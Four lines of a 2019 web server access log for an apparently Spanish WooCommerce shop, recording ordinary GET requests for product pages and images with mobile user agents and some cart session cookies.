112.113.220.111 - - [11/Dec/2019:08:14:12 +0100] "GET /categoria-producto/inicio/page/18/?add-to-cart=18695 HTTP/1.1" 200 78915 "-" "Mozilla/5.0(Linux;Android 5.1.1;OPPO A33 Build/LMY47V;wv) AppleWebKit/537.36(KHTML,link Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 LieBaoFast/4.51.3" "woocommerce_cart_hash=52dd3778dd6ccd3f19e7ff55099f17ea; woocommerce_items_in_cart=1; wp_woocommerce_session_fb86dbb0e6335d960ea3e94e06b25287=d0250272e5c760259248d7c43f35ac0e%7C%7C1576221248%7C%7C1576217648%7C%7C57ce67437033544ff7bb9a2297ed84b8; wpfront-notification-bar-landingpage=1"
27.40.90.218 - - [11/Dec/2019:08:14:14 +0100] "GET /categoria-producto/carpas/ HTTP/1.1" 200 60206 "-" "Mozilla/5.0 (Linux; Android 7.0; FRD-AL00 Build/HUAWEIFRD-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043602 Safari/537.36 MicroMessenger/6.5.16.1120 NetType/WIFI Language/zh_CN" "wpfront-notification-bar-landingpage=1"
49.70.153.232 - - [11/Dec/2019:08:14:39 +0100] "GET /wp-content/uploads/2019/03/VA-PARADE-4.png HTTP/1.1" 200 362063 "-" "Mozilla/5.0(Linux;Android 5.1.1;OPPO A33 Build/LMY47V;wv) AppleWebKit/537.36(KHTML,link Gecko) Version/4.0 Chrome/42.0.2311.138 Mobile Safari/537.36 Mb2345Browser/9.0" "-"
182.111.49.116 - - [11/Dec/2019:08:14:41 +0100] "GET /producto/camiseta-tecnica-aintree HTTP/1.1" 301 3557 "-" "Mozilla/5.0 (Linux; Android 7.0; FRD-AL00 Build/HUAWEIFRD-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043602 Safari/537.36 MicroMessenger/6.5.16.1120 NetType/WIFI Language/zh_CN" "-"
